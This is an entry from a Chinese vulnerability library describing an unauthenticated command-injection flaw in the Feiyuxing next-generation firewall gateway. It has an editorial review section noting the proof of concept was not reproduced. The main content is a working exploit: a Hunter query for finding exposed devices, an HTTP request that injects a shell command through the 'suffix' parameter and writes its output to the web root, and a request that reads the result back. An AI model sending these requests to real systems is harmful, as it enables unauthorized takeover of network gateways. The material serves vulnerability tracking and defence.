---
source: "wy876 漏洞文库"
id: "vw-d08a81ad592cdf72e4244d5f"
entity_id: "ve-d08a81ad592cdf72e4244d5f"
schema_version: "1"
title: "飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞"
product: "飞鱼星下一代防火墙安全网关"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie，未列固件/认证"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_portal_auth_wchat_submit%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qc40w8qnkoefmbpx"
source_status: "recorded"
previous_fofa_unverified: "web.title="
hunter: "web.title=\"下一代防火墙安全网关\"&&web.body=\"./webui/js/jquerylib/\""
---

# 飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：飞鱼星下一代防火墙安全网关
- 本文讨论：webui aaa_portal_auth_wchat_submit suffix注入
- 版本、权限与配置前提：无cookie，未列固件/认证
- 资料类型：命令注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 指纹jquerylib与其他OEM类似，需独立确认品牌归属；无响应
- fofa实际Hunter残缺，缺修复版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- OEM产品、认证和文件读回证据待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 飞鱼星下一代防火墙安全网关

# 三、资产测绘
+ hunter`web.title="下一代防火墙安全网关"&&web.body="./webui/js/jquerylib/"`
+ 特征


# 四、漏洞复现
```http
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```http
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qc40w8qnkoefmbpx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
